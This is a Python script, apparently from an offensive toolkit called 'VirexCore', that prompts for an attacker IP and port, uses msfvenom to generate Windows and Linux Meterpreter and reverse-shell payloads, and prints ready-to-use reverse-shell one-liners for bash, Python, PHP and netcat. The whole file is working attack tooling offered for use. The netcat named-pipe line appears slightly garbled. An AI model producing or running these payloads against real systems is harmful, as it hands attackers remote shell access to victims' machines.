#!/usr/bin/env python3
import os
import sys
import subprocess

# Colors
RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
CYAN = "\033[1;36m"
BOLD = "\033[1m"
RESET = "\033[0m"

def create_target_directory(target):
    """Create the target directory in /tmp/VirexCore/"""
    target_dir = f"/tmp/VirexCore/{target}"
    os.makedirs(target_dir, exist_ok=True)
    
    # Create payloads subdirectory
    payloads_dir = os.path.join(target_dir, "payloads")
    os.makedirs(payloads_dir, exist_ok=True)
    
    return target_dir, payloads_dir

def generate_payload(payloads_dir, lhost, lport, output_format, payload_type):
    """Generate reverse shell payload using msfvenom"""
    output_file = os.path.join(payloads_dir, f"reverse_shell.{output_format}")
    
    print(f"{YELLOW}[~] Generating {output_format} payload...{RESET}")
    
    try:
        cmd = ["msfvenom", "-p", payload_type, f"LHOST={lhost}", f"LPORT={lport}", "-f", output_format]
        with open(output_file, 'wb') as f:
            subprocess.run(cmd, stdout=f, check=True)
        
        print(f"{GREEN}[✓] Payload saved to {output_file}{RESET}")
        return output_file
    except subprocess.CalledProcessError:
        print(f"{RED}[!] Error generating payload{RESET}")
        return None
    except FileNotFoundError:
        print(f"{RED}[!] msfvenom not found. Please install Metasploit.{RESET}")
        return None

def show_manual_payloads(lhost, lport):
    """Display manual reverse shell payloads"""
    print(f"\n{CYAN}[+] Manual reverse shell payloads:{RESET}")
    
    print(f"\n{GREEN}Bash:{RESET}")
    print(f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1")
    
    print(f"\n{GREEN}Python:{RESET}")
    print(f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
    
    print(f"\n{GREEN}PHP:{RESET}")
    print(f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
    
    print(f"\n{GREEN}Netcat:{RESET}")
    print(f"nc -e /bin/sh {lhost} {lport}")
    print(f"rm -f /tmp/p; mknod /tmp/p p && nc {lhost} {lport} 0/tmp/p")

def main():
    """Main function"""
    if len(sys.argv) < 2:
        print(f"{RED}Usage: {sys.argv[0]} <target_ip_or_domain>{RESET}")
        sys.exit(1)
    
    target = sys.argv[1]
    target_dir, payloads_dir = create_target_directory(target)
    
    print(f"{GREEN}[+] Target: {target}{RESET}")
    print(f"{GREEN}[+] Output directory: {payloads_dir}{RESET}")
    
    # Get user input
    lhost = input(f"{CYAN}→ Enter LHOST (Your IP) [default: 192.168.1.5]: {RESET}") or "192.168.1.5"
    lport = input(f"{CYAN}→ Enter LPORT (Your Port) [default: 4444]: {RESET}") or "4444"
    
    print(f"{CYAN}→ Select output format:{RESET}")
    print(f"{GREEN}1. exe (Windows){RESET}")
    print(f"{GREEN}2. elf (Linux){RESET}")
    print(f"{GREEN}3. raw (Raw format){RESET}")
    
    format_choice = input(f"{CYAN}→ Enter choice [1-3]: {RESET}")
    output_format = {"1": "exe", "2": "elf", "3": "raw"}.get(format_choice, "exe")
    
    print(f"{CYAN}→ Select payload type:{RESET}")
    print(f"{GREEN}1. windows/meterpreter/reverse_tcp{RESET}")
    print(f"{GREEN}2. linux/x86/meterpreter/reverse_tcp{RESET}")
    print(f"{GREEN}3. cmd/unix/reverse_python{RESET}")
    
    payload_choice = input(f"{CYAN}→ Enter choice [1-3]: {RESET}")
    payload_type = {
        "1": "windows/meterpreter/reverse_tcp",
        "2": "linux/x86/meterpreter/reverse_tcp",
        "3": "cmd/unix/reverse_python"
    }.get(payload_choice, "windows/meterpreter/reverse_tcp")
    
    # Generate payload
    generate_payload(payloads_dir, lhost, lport, output_format, payload_type)
    
    # Show manual payloads
    show_manual_payloads(lhost, lport)

if __name__ == "__main__":
    main()